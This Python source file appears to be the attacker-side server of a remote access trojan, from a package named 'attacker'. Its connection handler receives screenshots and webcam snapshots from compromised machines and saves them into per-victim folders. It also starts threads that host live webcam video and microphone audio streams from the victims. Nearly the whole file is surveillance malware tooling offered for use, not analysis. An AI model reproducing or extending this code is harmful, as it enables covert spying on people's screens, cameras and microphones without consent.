import asyncore
import os
import threading
from attacker.util import *

# point to the project attacker folder (one level up from terminal package)
CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))

class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_screenshot = False
    receiving_livefeed = False
    receiving_snapshot = False

    def __init__(self, sock, addr, window, iD, connections):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1
        self.snapshot_number = 1
        self.addr = addr
        self._connections = connections

    def video_stream():
        os.system("python webcam-host.py")

    def audio_stream():
        os.system("python microphone-host.py")

    def handle_read(self):
        global CURRENT_FOLDER, video_thread

        if ConnectionHandler.receiving_snapshot:
            data = self.recv(609600)
            image_name = f"snapshot_NUM{self.snapshot_number}.png"

            if not f"webcam{self.id}" in os.listdir():
                os.mkdir(f"webcam{self.id}")

            with open(f"webcam{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.snapshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SNAPSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_snapshot = False

        elif ConnectionHandler.receiving_screenshot:
            data = self.recv(609600)
            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"

            if not f"screenshots{self.id}" in os.listdir():
                os.mkdir(f"screenshots{self.id}")

            with open(f"screenshots{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.screenshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SCREENSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_screenshot = False

        else:
            data = self.recv(8096).decode("Cp1252")
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_screenshot = True
            if data == "Taken Snapshot":
                ConnectionHandler.receiving_snapshot = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                self.window.Output.addItem(f"\n{ts()} {data}")

    def handle_close(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONN_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))

